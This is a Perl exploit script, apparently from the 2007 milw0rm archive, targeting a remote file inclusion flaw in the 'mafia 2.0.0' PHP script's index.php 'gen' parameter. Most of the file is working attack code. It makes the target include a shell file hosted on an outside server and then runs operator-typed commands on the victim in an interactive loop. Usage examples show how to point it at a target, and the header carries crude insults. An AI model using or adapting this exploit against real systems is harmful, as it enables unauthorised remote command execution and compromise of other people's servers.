#!/usr/bin/perl

##########################################################################################################
#                                                                                                        #
# mafia-2-0-0 (Index.php)Remote File Include Vulnerability                              		 #
#                                                                                                        #
# Bug Found : DeltahackingTEAM discovery:Dr.Pantagon & Exploitet By Dr.Pantagon                          #
#                                                                                                        #
# Class:  Remote File Include Vulnerability                                                              #
#                                                                                                        #
# exemplary Exp: http://www.site.com/index.php?gen=                                         		 #
#                                                                                                        #
# Remote: Yes                                                                                            #
#                                                                                                        #
# Type:   Highly critical                                                                                #
#                                                                                                        #
# Vulnerable Code:include($gen."header.php");                            				 #
#                                                                                                        #
# Download:http://switch.dl.sourceforge.net/sourceforge/adv-random-gen/mafia-2-0-0.tar.gz                #
#                                                                                                        #
# Ptach : www.Advistory.deltasecurity.ir                                                                 #
#                                                                                                        #
# Bug Found : DeltahackingTEAM Exploitet Discovered & Exploitet: Dr.Pantagon<Dr.Pantagon[A]Gmail.com     #
#                                                                                                        #
# Exploit: mafia.pl                                                                                      #
#                                                                                                        #
# Web Site:www.deltasecurity.ir                                                				 #
#                                                                                                        #                             
#SP FUCK.............: z_zer0c00l(floozie Mother Test 100%=z_zer0c00l=misbegotten:D)                     #
##########################################################################################################

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$file = "index.php?gen=";

if(!$target || !$shellsite)
{
    usage();
}

header();

print "Type 'exit' to quit";
print "[cmd]\$";
$cmd = <STDIN>;

while ($cmd !~ "exit")
{
    $xpl = LWP::UserAgent->new() or die;
        $req = HTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd) or die("\n\n Failed to connect.");
        $res = $xpl->request($req);
        $r = $res->content;
        $r =~ tr/[\n]/[&#234;]/;

    if (@ARGV[4] eq "-r")
    {
        print $r;
    }
    elsif (@ARGV[5] eq "-p")
    {
    # if not working change cmd variable to null and apply patch manually.
    $cmd = "echo if(basename(__FILE__) == basename(\$_SERVER['PHP_SELF'])) die(); >> list_last.inc";
    print q
    {

    }
    }
    else
    {
    print "[cmd]\$";
    $cmd = <STDIN>;
    }
}

sub header()
{
    print q
    {
#################################################################################
                                 Only Str0ke
                        Bug Found : DeltahackingTEAM
               mafia.pl   - Remote File Include Exploit
            Vulnerability discovered and exploitet by Dr.Pantagon
                          Dr.Pantagon@Gmail.com
                           www.DeltaSecurity.ir
#################################################################################
    };
}

sub usage()
{
header();
    print q
    {
########################################################################
Usage:
perl mafia.pl <Target website> <Shell Location> <CMD Variable> <-r> <-p>
<Target Website> - Path to target eg: www.lashiyane.org
<Shell Location> - Path to shell eg: d4wood.by.ru/cmd.gif
<CMD Variable> - Shell command variable name eg: Pwd
<r> - Show output from shell
<p> - index.php
Example:
perl mafia.pl  http://localhost/include http://localhost/s.txt cmd -r -p
########################################################################
    };
exit();
}

# milw0rm.com [2007-01-21]
